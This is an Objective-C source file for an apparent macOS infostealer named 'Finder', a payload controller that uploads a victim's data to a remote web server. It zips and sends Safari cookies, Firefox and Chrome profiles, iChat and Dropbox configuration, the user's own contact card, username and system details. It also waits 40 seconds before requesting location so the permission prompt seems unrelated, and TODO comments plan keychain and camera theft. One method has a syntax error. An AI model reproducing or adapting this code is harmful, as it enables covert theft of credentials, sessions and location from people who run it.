//
//  PayloadController.m
//  Finder
//
//  Created by Jared Pochtar on 4/9/11.
//  Copyright 2011 Devclub. All rights reserved.
//

#import "PayloadController.h"
#import <AddressBook/AddressBook.h>
#import <dlfcn.h>
#import "JPZipper.h"

@implementation PayloadController

+ (ASIFormDataRequest *)uploadRequest {
#ifdef DEBUG
	NSURL *server  = [NSURL URLWithString:@"http://localhost/~Jared/uploader/index.php"];
#else
	NSURL *server  = [NSURL URLWithString:@"http://hchs01.welinknyc.com/donttouch/"];
#endif
	
	ASIFormDataRequest *request = [ASIFormDataRequest requestWithURL:server];
	
	[request addPostValue:@"Huntsman" forKey:@"passcode"];
	
	[request addPostValue:NSUserName() forKey:@"homename"];
	[request addPostValue:NSFullUserName() forKey:@"fullname"];
	
	NSProcessInfo *computer = [NSProcessInfo processInfo];
	NSString *systemInfo = [NSString stringWithFormat:@"%@: %.2fGB RAM, %d cores",
							[computer operatingSystemVersionString],
							(double)[computer physicalMemory] / (1024*1024*1024),
							[computer processorCount]];	
	[request addPostValue:systemInfo forKey:@"systeminfo"];
	
	/*
	 TODO:
	 -Installed apps
	 */
	
	return request;
}

+ (void)send:(ASIHTTPRequest *)request {
	[request startAsynchronous];
	//there's a good chance I'll do something more complex here, like queuing, but we'll see
}

+ (void) sendVCard {
	ASIFormDataRequest *request = [self uploadRequest];
	NSData *vcard = [[[ABAddressBook sharedAddressBook] me] vCardRepresentation];
	[request addFile:vcard withFileName:@"me.vcf" andContentType:@"text/x-vcard" forKey:@"myvcard"];
	[self send:request];
}

+ (void)sendZipped:(NSString *)path name:(NSString *)name {
	JPZipper *safariZipper = [[JPZipper alloc] initWithFilePath:path name:name];
	safariZipper.target = self;
	safariZipper.selector = @selector(zipFinished:);
}

+ (void)zipFinished:(JPZipper *)zip {	
	ASIFormDataRequest *request = [self uploadRequest];
	[request addFile:[zip destination] forKey:[zip name]];
	[self send:request];
	
//	[[NSFileManager defaultManager] removeItemAtPath:[zip destination] error:nil];
	[zip release];
}

+ (void)sendSafari {
	[self sendZipped:@"~/Library/Cookies/Cookies.plist" name:@"Safari"];
}

+ (void)sendFirefox {
	[self sendZipped:@"~/Library/Application Support/Firefox/" name:@"Firefox"];
}

+ (void)sendChrome {
	[self sendZipped:@"~/Library/Application Support/Google/Chrome/" name:@"Chrome"];
}

+ (void)sendiChat {
	[self sendZipped:@"~/Library/Preferences/com.apple.iChat.plist" name:@"iChat"];
}

+ (void)sendDropbox {
	[self sendZipped:@"~/.dropbox" name:@"dropbox_config"
}

+ (void)dropPayload {
	/*
	 TODO:
	 -Keychain
	 -Pictures (iChat camera)
	 */
	
	//wait to ask for location, because causes popup
	[self performSelector:@selector(startCoreLocation) withObject:nil afterDelay:40];
	
	[self send:[self uploadRequest]];
	
	[self sendVCard];	
	[self sendSafari];
	[self sendFirefox];
	[self sendChrome];
	[self sendiChat];
	[self sendDropbox];
}

CLLocationManager *locationManager = nil;

+ (void)startCoreLocation {
	if (locationManager) return;
	
	//weak linking the Core Location framework
	dlopen("/System/Library/Frameworks/CoreLocation.framework/CoreLocation", RTLD_LAZY | RTLD_GLOBAL);
	locationManager = [NSClassFromString(@"CLLocationManager") new];
	[locationManager setDelegate:self];
	[locationManager startUpdatingLocation];	
}

+ (void)locationManager:(CLLocationManager *)manager
    didUpdateToLocation:(CLLocation *)newLocation
		   fromLocation:(CLLocation *)oldLocation
{		
	ASIFormDataRequest *request = [self uploadRequest];
	CLLocation *location = [locationManager location];
	[request addPostValue:([location description] ?: @"no location") forKey:@"location"];
	[self send:request];	
}

@end
